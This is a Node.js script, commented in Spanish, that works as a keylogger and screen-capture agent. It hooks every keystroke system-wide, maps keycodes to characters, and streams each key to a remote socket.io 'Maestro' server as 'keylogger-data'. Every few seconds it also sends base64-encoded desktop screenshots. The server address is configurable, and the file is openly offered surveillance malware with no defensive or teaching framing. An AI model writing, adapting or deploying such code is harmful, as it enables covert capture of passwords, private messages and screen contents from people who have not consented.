#!/usr/bin/env node
const io = require('socket.io-client');
const uiohookModule = require('uiohook-napi');
const screenshot = require('screenshot-desktop');
const os = require('os');

// --- DETECCIÓN DINÁMICA DE LA LIBRERÍA ---
let uiohook = null;
if (uiohookModule.on) uiohook = uiohookModule;
else if (uiohookModule.uiohook && uiohookModule.uiohook.on) uiohook = uiohookModule.uiohook;
else if (uiohookModule.uIOhook) uiohook = uiohookModule.uIOhook;
else if (uiohookModule.default) uiohook = uiohookModule.default;

if (!uiohook || !uiohook.on) {
    console.error("❌ Error: No se pudo inicializar uiohook-napi. Revisa la instalación.");
    process.exit(1);
}

// --- CONFIGURACIÓN ---
const args = process.argv.slice(2);
const config = {
  server: '127.0.0.1',
  port: 3001,
  label: os.hostname()
};

for (let i = 0; i < args.length; i += 2) {
  const key = args[i].replace('--', '');
  const value = args[i + 1];
  if (key && value) config[key] = isNaN(value) ? value : parseInt(value);
}

const serverUrl = `http://${config.server}:${config.port}`;
const socket = io(serverUrl, { transports: ['websocket'] });

console.log(`\n🚀 AGENTE ACTIVO: ${config.label}`);
console.log(`🔗 CONECTANDO A: ${serverUrl}\n`);

// --- LÓGICA DE CAPTURA ---

// Mapeo mejorado de teclas comunes para uiohook
const keyMap = {
    // Teclas de función y control
    1: '[ESC]', 14: '[BORRAR]', 15: '[TAB]', 28: '\n', 29: '[CTRL]', 42: '[SHIFT]', 56: '[ALT]', 57: ' ',
    // Fila superior (Números)
    2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    // Letras - Fila 1
    16: 'Q', 17: 'W', 18: 'E', 19: 'R', 20: 'T', 21: 'Y', 22: 'U', 23: 'I', 24: 'O', 25: 'P',
    // Letras - Fila 2
    30: 'A', 31: 'S', 32: 'D', 33: 'F', 34: 'G', 35: 'H', 36: 'J', 37: 'K', 38: 'L',
    // Letras - Fila 3
    44: 'Z', 45: 'X', 46: 'C', 47: 'V', 48: 'B', 49: 'N', 50: 'M',
    // Navegación
    57416: '[UP]', 57424: '[DOWN]', 57419: '[LEFT]', 57421: '[RIGHT]', 3653: '[SUPR]'
};

// Función para enviar una sola tecla instantáneamente
function sendKey(keyChar) {
    if (!socket.connected) return;
    
    const payload = {
        time: new Date().toISOString(),
        log: keyChar,
        remoteIp: config.label,
        capture: '' // Las teclas individuales no llevan captura para no saturar
    };
    
    socket.emit('keylogger-data', payload);
    process.stdout.write(keyChar); // Feedback en tu terminal local
}

// Función para enviar captura de pantalla periódica
async function sendScreenshot() {
    if (!socket.connected) return;

    try {
        const img = await screenshot({ format: 'png' });
        const payload = {
            time: new Date().toISOString(),
            log: '[SCREENSHOT AUTOMÁTICA]',
            remoteIp: config.label,
            capture: img.toString('base64')
        };
        socket.emit('keylogger-data', payload);
        console.log('\n📸 Captura de pantalla enviada al servidor.');
    } catch (err) {
        console.error('\n❌ Error en screenshot:', err.message);
    }
}

// --- EVENTOS ---

uiohook.on('keydown', (event) => {
    if (event.keycode === 1) cleanup(); // ESC para salir

    // Buscamos en nuestro mapa; si no está, mostramos el código para que puedas agregarlo luego
    let char = keyMap[event.keycode] || `[K${event.keycode}]`;
    
    sendKey(char);
});

// Enviar screenshot cada 15 segundos
setInterval(sendScreenshot, 5000);

socket.on('connect', () => console.log('✅ Conectado al Maestro. Transmitiendo...'));
socket.on('disconnect', () => console.log('❌ Desconectado del Maestro.'));

function cleanup() {
    try { uiohook.stop(); } catch(e) {}
    socket.disconnect();
    process.exit(0);
}

process.on('SIGINT', cleanup);
uiohook.start();